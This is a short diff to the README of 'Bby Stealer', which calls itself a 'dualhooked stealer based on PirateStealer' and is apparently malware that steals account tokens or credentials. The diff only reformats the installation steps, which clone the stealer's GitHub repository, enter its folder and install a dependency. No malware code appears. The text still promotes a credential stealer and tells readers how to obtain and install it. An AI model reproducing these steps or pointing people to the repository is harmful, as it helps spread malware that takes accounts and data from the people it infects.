@@ -4,8 +4,10 @@ Bby Stealer is a dualhooked stealer based on PirateStealer and we all know that.
 
 # Installation
 
-git clone https://github.com/Kamatera1337/BbyDualhook \n
+git clone https://github.com/Kamatera1337/BbyDualhook
+
 cd BbyDualhook
+
 npm i requests
 
 # How to use
